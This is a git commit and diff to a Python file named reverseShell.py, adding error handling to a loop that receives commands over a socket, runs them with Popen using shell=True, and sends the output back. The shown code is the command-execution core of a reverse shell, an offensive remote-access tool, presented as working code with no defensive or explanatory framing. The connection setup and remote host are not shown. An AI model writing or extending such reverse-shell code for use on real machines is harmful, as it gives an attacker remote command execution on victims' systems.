73b90326ac1d052b3c35401a464cef3c38d8f9f9
hnsengimana <hansnsengimana10@gmail.com>
2022-04-06 11:11:03 -0400

    now does error catching for the shell

--- reverseShell.py
+++ reverseShell.py
@@ -22,11 +22,15 @@ while command != "exit":
 			clientSocket.send("Invalid directory path")
 		command = (clientSocket.recv(4064)).decode()
 	else:
-		proc = Popen(command.split(" "), stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
-		result, err = proc.communicate()
-		if(err != ""):
-			print(err)
-		clientSocket.send(result + err)
+		try:
+			proc = Popen(command.split(" "), stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
+			result, err = proc.communicate()
+			if(err != ""):
+				print(err)
+			clientSocket.send(result + err)
+		except:
+			clientSocket.send("invalid command")
+	
 		command = (clientSocket.recv(4064)).decode()
 	
 
